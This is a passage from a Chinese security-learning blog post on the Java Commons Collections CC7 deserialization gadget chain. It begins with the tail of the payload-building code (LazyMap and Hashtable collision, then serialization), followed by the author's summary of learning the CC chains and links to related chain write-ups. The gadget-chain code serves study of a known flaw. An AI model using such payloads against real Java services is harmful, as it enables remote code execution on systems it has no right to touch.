class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        LazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">LazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        LazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(LazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(LazyMap2,<span class="number">1</span>);</span><br><span class="line">        LazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;serialize&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>断断续续学了一周，总算是把7条CC链学完了，成功迈出了学习java安全的第一步，下面就是做题和其他的链子了。总的来说CC链学会调试，学会基本方法和思路来说不是很难，很多链子都是互相相似的，比如CC1与CC5、CC7等。重要的链子就是CC1、CC3、CC6这三条，CC1的动态代理，CC3的代码执行。</p>
+<p>学不懂多看几遍视频，多看几篇文章，虽然很难，慢慢啃肯定是没问题的，更何况我们是站在前人的肩膀上。</p>
+<hr style="border: 1px solid black;"/>
+
+<p><strong>自己有了光芒才配得上自己追逐的星星。</strong></p>
+<hr style="border: 1px solid black;"/>
+
+<p>继续加油吧！</p>
+<p>最后附上CC链的思维导图：</p>
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/CCchains.jpg" alt="CCchains"></p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/computer.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5%E9%93%BE/" title="JAVA反序列化——CC5链" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/" title="JAVA反序列化——CB链">
+								JAVA反序列化——CB链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 24日, 2024				
+							</p>
+							<p class="relate-post-content">
+								依赖jdk：jdk8u65
+CB：commons-beanutils 1.8.3
+在pom.xml里添加
+12345678910&lt;dependency&gt;      &lt;groupId&gt;commons-beanut...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/" title="JAVA反序列化——CB链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CB链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5%E9%93%BE/" title="JAVA反序列化——CC5链">
+								JAVA反序列化——CC5链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 18日, 2024				
+							</p>
+							<p class="relate-post-content">
+								CC5也是在CC1的路线上改了改入口类。
+从AnnotationInvocationHandler.readObject改成了BadAttributeValueExpException.readObject
+沿用CC1从LazyMap...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5%E9%93%BE/" title="JAVA反序列化——CC5链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC5链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/" title="JAVA反序列化——另一条CC1链">
+								JAVA反序列化——另一条CC1链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								之前的CC1链是利用TransformedMap的checkSetValue方法来调用ChainedTransformer.transform
+而另一种写法是利用LazyMap.get方法走动态代理来调用ChainedTransfor...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/" title="JAVA反序列化——另一条CC1链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——另一条CC1链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/" title="JAVA反序列化——CC2链">
+								JAVA反序列化——CC2链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								详细请看CC4链。CC2链跟CC4链几乎一样，就是在CC4利用InstantiateTransformer类的基础上改成了直接使用InvokerTransformer，其他没变。
+123456CC4：Transformer[] tra...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/" title="JAVA反序列化——CC2链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC2链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/" title="JAVA反序列化——CC4链">
+								JAVA反序列化——CC4链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								新依赖：
+12345&lt;dependency&gt;    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;    &lt;artifactId&gt;commons-collec...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/" title="JAVA反序列化——CC4链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC4链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/" title="JAVA反序列化——CC3链">
+								JAVA反序列化——CC3链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								这条链是利用动态类加载来经行代码执行。
+原理根据java类的动态加载原理，我们知道动态类加载可以通过ClassLoader来完成。而其中有个ClassLoader.defineClass可以从字节码加载任意类。
+因为是动态类加载，我们...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/" title="JAVA反序列化——CC3链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC3链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="JAVA反序列化——CC6链">
+								JAVA反序列化——CC6链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 10日, 2024				
+							</p>
+							<p class="relate-post-content">
+								CC6链其实就是URLDNS链的前半加上CC1链的后半。
+
+链子构建入口类跟CC1链完全一致，这里不再赘述。
+在找哪里调用了ChainedTransformer.transform方法时，CC1链是找到了TransformedMap类...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="JAVA反序列化——CC6链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC6链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">
+								JAVA反序列化——CC1链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 2日, 2024				
+							</p>
+							<p class="relate-post-content">
+								前言CC1链有两种写法，我这种写法跟ysoserial里的写法不一样，另一种写法写在另一篇文章。
+cc1链要求java版本小于jdk8u71
+我这里用的JDK版本是8u66
+因为在高版本这条链子最后的annotationInvocat...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC1链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">
+								java反序列化——URLDNS链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								原理：根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。
+
+而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：
+
+
+而在这...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="java反序列化——URLDNS链"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
+								NepCTF2024部分web			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
+12if os.path.islink(new_file):    return &...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: '333--',
+			clientSecret: '333--',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'annie-gitalk',
+			owner: 'Sariay',
+			admin: 'Sariay',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by Infernity. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+  
+<script src="/plugin/leancloud/av-min.js"></script>
+<script src="/js/leancloud-count.js"></script>
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
